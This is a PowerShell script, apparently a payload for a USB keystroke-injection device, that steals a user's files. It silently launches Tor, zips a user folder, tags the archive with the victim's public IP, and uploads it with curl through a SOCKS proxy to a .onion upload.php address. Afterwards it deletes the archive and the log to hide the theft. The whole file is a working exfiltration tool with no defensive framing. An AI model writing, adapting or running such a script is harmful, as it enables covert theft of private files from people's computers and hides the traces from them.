# Set paths
$drive = [Environment]::GetFolderPath("UserProfile") + "\Desktop\ducky"
$torPath = "$drive\tor\tor.exe"
$torrcPath = "$drive\tor\torrc"
$curlPath = "$drive\curl\curl.exe"
# $userPath = [Environment]::GetFolderPath("UserProfile")
$userPath = "$drive\test"
$onionURL = "rokyn4z5yzjmbwb5pr5mdes2rmogz2vzfmrvt4mx6ur5mum5bqytkcad.onion/upload.php"
$logFile = "$drive\tor.log"
Set-Content -Path $torrcPath -Value @"
SocksPort 9050
ClientOnionAuthDir $drive\tor\auth
Log notice file $logFile
"@

# Start Tor
$torProcess = Start-Process -FilePath $torPath -ArgumentList "-f `"$torrcPath`"" -RedirectStandardOutput "$drive\tor.log" -WindowStyle Hidden -PassThru

# Wait for Tor to bootstrap
$bootstrapped = $false
$maxWait = 30
$elapsed = 0


while (-not $bootstrapped -and $elapsed -lt $maxWait) {
    Start-Sleep -Seconds 1
    $elapsed++
    if (Test-Path $logFile) {
        $log = Get-Content $logFile -Tail 10 -ErrorAction SilentlyContinue
        if ($log -match "Bootstrapped 100%") {
            $bootstrapped = $true
        }
    }
}

# Zip user folder
$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
$publicIP = (Invoke-RestMethod -Uri "http://checkip.amazonaws.com").Trim()
$filename = "$drive\dump_${publicIP}_$timestamp.zip"
Add-Type -A 'System.IO.Compression.FileSystem'
[IO.Compression.ZipFile]::CreateFromDirectory($userPath, $filename)

Start-Process -FilePath $curlPath -ArgumentList "--proxy", "socks5h://127.0.0.1:9050", "-F", "file=@$filename", $onionURL -NoNewWindow -Wait

# After completing tasks, stop the Tor process
if ($torProcess -and !$torProcess.HasExited) {
    Stop-Process -Id $torProcess.Id -Force
}

# Cleanup
Remove-Item $filename
Remove-Item $logFile
